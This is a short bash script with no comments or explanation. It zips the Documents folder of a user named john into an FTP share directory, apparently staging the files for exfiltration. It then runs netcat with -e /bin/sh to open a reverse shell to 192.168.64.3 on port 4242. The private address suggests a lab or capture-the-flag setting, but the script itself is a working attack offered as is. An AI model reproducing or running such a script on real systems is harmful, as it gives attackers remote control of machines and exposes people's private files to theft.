#!/bin/bash

set -e 

main()
{

	zip -r /ftp/home/share/extract.zip /home/john/Documents/ /ftp/home/share
	nc -e /bin/sh 192.168.64.3 4242

}

main
